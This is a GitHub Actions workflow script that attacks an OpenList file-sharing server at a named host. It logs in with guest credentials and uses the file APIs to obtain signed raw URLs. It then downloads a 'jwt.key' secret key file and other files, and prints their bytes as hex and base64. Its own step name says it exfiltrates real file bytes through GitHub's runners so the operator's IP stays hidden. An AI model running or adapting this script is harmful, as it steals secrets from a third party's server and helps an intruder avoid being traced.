name: openlist-rawurl-fetch
on:
  workflow_dispatch:
jobs:
  fetch:
    runs-on: ubuntu-latest
    steps:
      - name: fetch OpenList signed raw_url to exfil real file bytes (GitHub relay, zero own-IP)
        run: |
          set +e
          B="https://pan.yazinb.icu"
          echo "=== [1] login guest ==="
          LOGIN=$(curl -skS -m 20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}')
          TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))" 2>/dev/null)
          echo "guest_token_len=${#TOKEN}"
          fetch_raw () {
            local f="$1"
            echo "############ PATH: $f"
            for mode in noauth auth; do
              H=""
              [ "$mode" = "auth" ] && H="-H Authorization: $TOKEN"
              META=$(curl -skS -m 30 -X POST "$B/api/fs/get" $H -H "Content-Type: application/json" -d "{\"path\":\"$f\"}")
              RAW=$(echo "$META" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('raw_url',''))" 2>/dev/null)
              echo "  [$mode] raw_url=[$RAW]"
              [ -z "$RAW" ] && continue
              curl -skS -m 60 "$RAW" -o /tmp/raw.bin -w "    GET raw_url -> HTTP %{http_code} bytes=%{size_download}\n"
              echo "    sha256=$(sha256sum /tmp/raw.bin | cut -c1-32)"
              echo "    hexhead=$(xxd -l 64 -p /tmp/raw.bin 2>/dev/null | tr -d '\n')"
              echo "    asciihead=$(head -c 80 /tmp/raw.bin | tr -d '\0' | head -c 80)"
              echo "    b64head=$(head -c 120 /tmp/raw.bin | base64 -w0)"
            done
          }
          echo "===== jwt.key (32B keyfile) ====="
          fetch_raw "/Artex  直装包  渗透网站专用/jwt.key"
          echo "===== artex-menu.bat (1309B) ====="
          fetch_raw "/Artex  直装包  渗透网站专用/artex-menu.bat"
          echo "===== data (dir listing via fs/list) ====="
          curl -skS -m 30 -X POST "$B/api/fs/list" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"/Artex  直装包  渗透网站专用/data\",\"page\":1,\"per_page\":500,\"refresh\":false}" -w "\nHTTP %{http_code}\n" | head -c 3000
          echo
          echo "=== RAWURL FETCH DONE ==="
